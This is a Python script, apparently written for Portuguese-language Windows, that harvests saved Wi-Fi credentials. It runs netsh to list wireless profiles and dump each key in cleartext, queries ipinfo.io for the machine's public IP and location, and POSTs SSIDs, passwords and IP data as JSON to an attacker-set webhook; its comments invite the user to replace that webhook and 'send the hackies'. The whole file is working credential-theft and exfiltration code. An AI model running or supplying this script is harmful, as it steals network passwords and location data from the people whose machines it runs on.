import subprocess, sys, requests, re, json

# padrao_versao = r'Vers.o\s+:\s+(\d+)'
# padrao_nome = r'Nome\s+:\s+(.*)'
# padrao_autenticacao = r'Autentica..o\s+:\s+(.*)'
# padrao_codificacao = r'Codifica..o\s+:\s+(.*)'
padrao_ssid = r'Nome SSID\s+:\s+"(.*)"'
padrao_chave = r'Conte.do da Chave\s+:\s+(.*)'
wlan_profile_regex = r"(?<=:\s).*"

def parseNames(texto):
    return re.findall(wlan_profile_regex, texto)

def parseKey(texto):
    # versao = re.search(padrao_versao, texto).group(1)
    # nome = re.search(padrao_nome, texto).group(1)
    # autenticacao = re.search(padrao_autenticacao, texto).group(1)
    # codificacao = re.search(padrao_codificacao, texto).group(1)
    ssid = re.search(padrao_ssid, texto).group(1).strip()
    try:
        chave = re.search(padrao_chave, texto).group(1).strip()
    except:
        raise KeyError
    return {
        'SSID': ssid,
        'Chave': chave
    }


# Replace with your webhook
url = 'http://127.0.0.1:5000/wifi'

# Lists and regex
found_ssids = []
pwnd = []

#Use Python to execute Windows command
get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode("cp1252")

#Append found SSIDs to list
for match in parseNames(get_profiles_command):
    if not match == "":
        found_ssids.append(match.strip())

#Get cleartext password for found SSIDs and place into pwnd list
for ssid in found_ssids:
    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode("cp1252")
    try:
        pwnd.append(parseKey(get_keys_command)) 
    except:
        pass

if len(pwnd) > 0:
    print("Wi-Fi profiles found. Check your webhook")
    ip = subprocess.run(["curl", "ipinfo.io"], stdout=subprocess.PIPE).stdout.decode("cp1252")
    data = json.loads(ip)
    data['ssids'] = pwnd
else:
    print("No Wi-Fi profiles found. Exiting...")
    sys.exit()
print("Wi-Fi profiles found. Check your webhook...")

#Send the hackies to your webhookz
final_payload = json.dumps(data, indent=4)
print(final_payload)
headers = {'Content-Type': 'application/json'}
response = requests.post(url, headers=headers, data=final_payload)
